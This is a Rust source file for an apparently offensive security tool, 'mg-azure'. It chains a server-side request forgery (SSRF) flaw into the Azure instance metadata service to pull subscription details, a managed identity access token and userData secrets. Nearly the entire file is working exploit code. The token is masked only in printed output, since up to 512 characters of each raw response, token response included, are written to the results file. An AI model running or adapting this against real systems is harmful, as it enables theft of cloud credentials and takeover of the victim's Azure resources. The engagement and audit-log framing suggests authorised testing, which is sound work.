/*******************************************************************
 * Filename:        main.rs
 * Author:          Jeff
 * Date:            2026-05-18
 * Description:     mg-azure — Azure IMDS managed identity token extraction
 *                  and instance info via a confirmed SSRF endpoint.
 * Notes:           Metadata: true header must be forwarded by the SSRF target.
 *                  access_token is masked to first 8 chars in all output.
 *                  Also probes the userData endpoint for leaked env vars.
 *******************************************************************/

use std::fs;
use std::path::Path;
use std::time::Duration;

use anyhow::{Context, Result};
use clap::Parser;
use serde::{Deserialize, Serialize};
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use url::Url;

use engagement::Engagement;

// ── Constants ────────────────────────────────────────────────────────────────

const IMDS_BASE: &str = "http://169.254.169.254";
// Instance metadata endpoint — returns JSON with subscriptionId, resourceGroup, vmId, location
const IMDS_INSTANCE_PATH: &str = "/metadata/instance?api-version=2021-02-01";
// Managed identity token endpoint
const IMDS_TOKEN_PATH: &str =
    "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/";
// Subscription ID as plain text (avoids parsing the full instance JSON)
const IMDS_SUB_ID_PATH: &str =
    "/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text";
// userData — may contain env vars or secrets
const IMDS_USERDATA_PATH: &str =
    "/metadata/instance/compute/userData?api-version=2021-02-01&format=text";
const IMDS_METADATA_HEADER: &str = "Metadata";
const IMDS_METADATA_VALUE: &str = "true";
const OUTPUT_SUBDIR: &str = "azure";
const OUTPUT_FILE_PREFIX: &str = "results-";
const AUDIT_TOOL: &str = "mg-azure";
const DEFAULT_TIMEOUT_SECS: u64 = 15;
// Show only this many chars of sensitive token values
const MASK_SHOW_CHARS: usize = 8;
const MASK_SUFFIX: &str = "****";
const ANSI_RED: &str = "\x1b[31m";
const ANSI_RESET: &str = "\x1b[0m";

// ── CLI ──────────────────────────────────────────────────────────────────────

#[derive(Parser, Debug)]
#[command(
    name = "mg-azure",
    about = "Azure IMDS SSRF chain — managed identity token and instance info extraction"
)]
struct Args {
    /// Engagement name
    engagement: String,

    /// Engagements root directory
    #[arg(long, env = "MG_ENGAGEMENTS_DIR", default_value = "engagements")]
    engagements_dir: String,

    /// SSRF endpoint to proxy requests through (e.g. https://target.com/fetch?url=)
    #[arg(long)]
    ssrf_url: String,

    /// HTTP timeout in seconds
    #[arg(long, default_value_t = DEFAULT_TIMEOUT_SECS)]
    timeout: u64,
}

// ── Data types ───────────────────────────────────────────────────────────────

// Relevant fields from /metadata/instance JSON (compute sub-object)
#[derive(Debug, Deserialize, Default)]
struct AzureComputeInfo {
    #[serde(rename = "subscriptionId", default)]
    subscription_id: String,
    #[serde(rename = "resourceGroupName", default)]
    resource_group_name: String,
    #[serde(rename = "vmId", default)]
    vm_id: String,
    #[serde(default)]
    location: String,
}

#[derive(Debug, Deserialize, Default)]
struct AzureInstanceInfo {
    #[serde(default)]
    compute: AzureComputeInfo,
}

// Shape of the managed identity token JSON response
#[derive(Debug, Deserialize)]
struct AzureToken {
    access_token: String,
    #[serde(default)]
    token_type: String,
    #[serde(default)]
    expires_in: String,
    #[serde(default)]
    resource: String,
}

// Result of one IMDS probe step
#[derive(Debug, Serialize)]
struct ProbeStep {
    metadata_url: String,
    ssrf_url_used: String,
    status: u16,
    body_preview: String,
    success: bool,
}

// Top-level output written to disk
#[derive(Serialize)]
struct AzureResults {
    engagement: String,
    timestamp: String,
    ssrf_url: String,
    confirmed_ssrf: bool,
    subscription_id: Option<String>,
    resource_group: Option<String>,
    vm_id: Option<String>,
    location: Option<String>,
    access_token_masked: Option<String>,
    token_type: Option<String>,
    token_expires_in: Option<String>,
    token_resource: Option<String>,
    subscription_id_plain: Option<String>,
    user_data: Option<String>,
    steps: Vec<ProbeStep>,
    high_severity: bool,
}

// ── Helpers ───────────────────────────────────────────────────────────────────

// Mask a sensitive value — show first MASK_SHOW_CHARS then asterisks
fn mask_sensitive(value: &str) -> String {
    if value.len() <= MASK_SHOW_CHARS {
        return MASK_SUFFIX.to_string();
    }
    format!("{}{MASK_SUFFIX}", &value[..MASK_SHOW_CHARS])
}

// Minimal percent-encoding for embedding a URL as a query parameter value
fn url_encode_simple(s: &str) -> String {
    s.chars()
        .flat_map(|c| match c {
            ' ' => vec!['%', '2', '0'],
            '&' => vec!['%', '2', '6'],
            '#' => vec!['%', '2', '3'],
            ':' => vec!['%', '3', 'A'],
            '/' => vec!['%', '2', 'F'],
            '?' => vec!['%', '3', 'F'],
            '=' => vec!['%', '3', 'D'],
            _ => vec![c],
        })
        .collect()
}

// Build a complete SSRF-proxied URL by appending the IMDS path to the SSRF base
fn build_ssrf_url(ssrf_base: &str, imds_path: &str) -> String {
    let meta_url = format!("{IMDS_BASE}{imds_path}");
    format!("{ssrf_base}{}", url_encode_simple(&meta_url))
}

// Validate that ssrf_url is a parseable URL with a scheme
fn validate_ssrf_url(url: &str) -> Result<()> {
    Url::parse(url).with_context(|| format!("invalid --ssrf-url: {url}"))?;
    Ok(())
}

// Record a probe step result
fn make_step(imds_path: &str, full_url: &str, status: u16, body: &str) -> ProbeStep {
    let preview_end = body.len().min(512);
    ProbeStep {
        metadata_url: format!("{IMDS_BASE}{imds_path}"),
        ssrf_url_used: full_url.to_string(),
        status,
        body_preview: body[..preview_end].to_string(),
        success: status == 200 && !body.trim().is_empty(),
    }
}

// ── Probe helpers ─────────────────────────────────────────────────────────────

// Send a GET through the SSRF proxy with the Metadata: true header
async fn ssrf_get(
    client: &reqwest::Client,
    ssrf_base: &str,
    imds_path: &str,
) -> (u16, String, String) {
    let full_url = build_ssrf_url(ssrf_base, imds_path);
    let req = client
        .get(&full_url)
        .header(IMDS_METADATA_HEADER, IMDS_METADATA_VALUE);
    match req.send().await {
        Ok(resp) => {
            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();
            (status, body, full_url)
        }
        Err(e) => (0, e.to_string(), full_url),
    }
}

// Extract a plain-text field from a successful probe
fn plain_text_value(status: u16, body: &str) -> Option<String> {
    if status != 200 {
        return None;
    }
    let v = body.trim().to_string();
    if v.is_empty() { None } else { Some(v) }
}

// ── Entry point ───────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    validate_ssrf_url(&args.ssrf_url).context("validate SSRF URL")?;

    let eng = Engagement::load_named(Path::new(&args.engagements_dir), &args.engagement)
        .with_context(|| format!("load engagement {}", args.engagement))?;

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(args.timeout))
        .user_agent("mg-azure/0.1")
        .danger_accept_invalid_certs(true)
        .build()
        .context("build HTTP client")?;

    let mut steps: Vec<ProbeStep> = Vec::new();

    // Step a: instance info — confirms SSRF and extracts subscription/resource/vm info
    eprintln!("mg-azure: probing Azure IMDS instance endpoint...");
    let (s_inst, b_inst, u_inst) = ssrf_get(&client, &args.ssrf_url, IMDS_INSTANCE_PATH).await;
    let confirmed_ssrf = s_inst == 200 && !b_inst.trim().is_empty();
    steps.push(make_step(IMDS_INSTANCE_PATH, &u_inst, s_inst, &b_inst));
    eprintln!("  instance: status={s_inst} confirmed={confirmed_ssrf}");

    let instance_info: AzureInstanceInfo = if s_inst == 200 {
        serde_json::from_str(&b_inst).unwrap_or_default()
    } else {
        AzureInstanceInfo::default()
    };
    let compute = &instance_info.compute;
    let subscription_id = non_empty(&compute.subscription_id);
    let resource_group = non_empty(&compute.resource_group_name);
    let vm_id = non_empty(&compute.vm_id);
    let location = non_empty(&compute.location);

    // Step b: managed identity token
    eprintln!("  probing managed identity token...");
    let (s_tok, b_tok, u_tok) = ssrf_get(&client, &args.ssrf_url, IMDS_TOKEN_PATH).await;
    steps.push(make_step(IMDS_TOKEN_PATH, &u_tok, s_tok, &b_tok));
    let (access_token_masked, token_type, token_expires_in, token_resource) = if s_tok == 200 {
        match serde_json::from_str::<AzureToken>(&b_tok) {
            Ok(tok) => (
                Some(mask_sensitive(&tok.access_token)),
                non_empty(&tok.token_type),
                non_empty(&tok.expires_in),
                non_empty(&tok.resource),
            ),
            Err(_) => (None, None, None, None),
        }
    } else {
        (None, None, None, None)
    };
    eprintln!(
        "  token: {}",
        if access_token_masked.is_some() { "obtained" } else { "none" }
    );

    // Step c: subscription ID as plain text (redundant but explicit)
    eprintln!("  probing subscription ID (plain text)...");
    let (s_sub, b_sub, u_sub) = ssrf_get(&client, &args.ssrf_url, IMDS_SUB_ID_PATH).await;
    steps.push(make_step(IMDS_SUB_ID_PATH, &u_sub, s_sub, &b_sub));
    let subscription_id_plain = plain_text_value(s_sub, &b_sub);

    // Step d: userData — may contain env vars or cloud-init secrets
    eprintln!("  probing userData...");
    let (s_ud, b_ud, u_ud) = ssrf_get(&client, &args.ssrf_url, IMDS_USERDATA_PATH).await;
    steps.push(make_step(IMDS_USERDATA_PATH, &u_ud, s_ud, &b_ud));
    let user_data = plain_text_value(s_ud, &b_ud);

    let high_severity = access_token_masked.is_some();

    // Print summary
    println!("\n=== Azure IMDS Chain via SSRF ===");
    println!("SSRF endpoint:  {}", args.ssrf_url);
    println!("SSRF confirmed: {}", if confirmed_ssrf { "YES" } else { "NO" });
    if let Some(ref sid) = subscription_id {
        println!("Subscription ID:   {sid}");
    }
    if let Some(ref rg) = resource_group {
        println!("Resource Group:    {rg}");
    }
    if let Some(ref vid) = vm_id {
        println!("VM ID:             {vid}");
    }
    if let Some(ref loc) = location {
        println!("Location:          {loc}");
    }
    if let Some(ref tok) = access_token_masked {
        println!("{ANSI_RED}[HIGH] Azure managed identity token extracted!{ANSI_RESET}");
        println!("  access_token (masked): {tok}");
        if let Some(ref tt) = token_type {
            println!("  token_type:            {tt}");
        }
        if let Some(ref exp) = token_expires_in {
            println!("  expires_in:            {exp}s");
        }
    }
    if let Some(ref ud) = user_data {
        println!("userData:          {} bytes (check for secrets)", ud.len());
    }

    // Write JSON output
    let out_dir = eng.root.join(OUTPUT_SUBDIR);
    fs::create_dir_all(&out_dir).context("create azure output dir")?;
    let ts = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let ts_file = ts.replace(':', "-").replace('+', "Z");
    let out_path = out_dir.join(format!("{OUTPUT_FILE_PREFIX}{ts_file}.json"));

    let results = AzureResults {
        engagement: args.engagement.clone(),
        timestamp: ts,
        ssrf_url: args.ssrf_url.clone(),
        confirmed_ssrf,
        subscription_id,
        resource_group,
        vm_id,
        location,
        access_token_masked,
        token_type,
        token_expires_in,
        token_resource,
        subscription_id_plain,
        user_data,
        steps,
        high_severity,
    };
    let json = serde_json::to_string_pretty(&results)?;
    fs::write(&out_path, &json).context("write results JSON")?;
    println!("[*] Results written to {}", out_path.display());

    // Audit log
    let detail = format!("confirmed={confirmed_ssrf} token={high_severity}");
    let _ = eng.audit(AUDIT_TOOL, &eng.meta.target, Some(&detail));

    Ok(())
}

// ── Helpers (internal) ────────────────────────────────────────────────────────

// Return Some(s) if the string is non-empty after trimming, else None
fn non_empty(s: &str) -> Option<String> {
    let v = s.trim().to_string();
    if v.is_empty() { None } else { Some(v) }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn mask_sensitive_shows_prefix_and_hides_rest() {
        let masked = mask_sensitive("eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9_secret");
        assert!(masked.starts_with("eyJhbGci"));
        assert!(masked.contains(MASK_SUFFIX));
    }

    #[test]
    fn mask_sensitive_short_returns_suffix_only() {
        let masked = mask_sensitive("tiny");
        assert_eq!(masked, MASK_SUFFIX);
    }

    #[test]
    fn url_encode_simple_encodes_colon_and_slash() {
        let encoded = url_encode_simple("http://169.254.169.254/metadata/");
        assert!(!encoded.contains(':'));
        assert!(!encoded.contains('/'));
        assert!(encoded.contains("%3A"));
        assert!(encoded.contains("%2F"));
    }

    #[test]
    fn build_ssrf_url_appends_encoded_imds_url() {
        let ssrf_base = "https://target.com/fetch?url=";
        let url = build_ssrf_url(ssrf_base, IMDS_INSTANCE_PATH);
        assert!(url.starts_with("https://target.com/fetch?url="));
        let appended = &url["https://target.com/fetch?url=".len()..];
        assert!(!appended.contains("://"));
        assert!(appended.contains("169.254.169.254"));
    }

    #[test]
    fn validate_ssrf_url_accepts_valid_urls() {
        assert!(validate_ssrf_url("https://target.com/ssrf?url=").is_ok());
        assert!(validate_ssrf_url("http://10.0.0.1/redirect?dest=").is_ok());
    }

    #[test]
    fn validate_ssrf_url_rejects_garbage() {
        assert!(validate_ssrf_url("not-a-url").is_err());
        assert!(validate_ssrf_url("").is_err());
    }

    #[test]
    fn non_empty_returns_none_for_blank() {
        assert!(non_empty("").is_none());
        assert!(non_empty("   ").is_none());
    }

    #[test]
    fn non_empty_trims_and_returns_content() {
        assert_eq!(non_empty("  sub-id-123  "), Some("sub-id-123".to_string()));
    }

    #[test]
    fn plain_text_value_returns_none_on_non_200() {
        assert!(plain_text_value(401, "unauthorized").is_none());
    }

    #[test]
    fn make_step_truncates_body_to_512() {
        let long = "a".repeat(1000);
        let step = make_step("/test", "https://x.com/", 200, &long);
        assert_eq!(step.body_preview.len(), 512);
    }

    #[test]
    fn make_step_success_requires_200_and_nonempty() {
        let ok = make_step("/test", "https://x.com/", 200, "data");
        assert!(ok.success);
        let fail = make_step("/test", "https://x.com/", 403, "forbidden");
        assert!(!fail.success);
    }
}
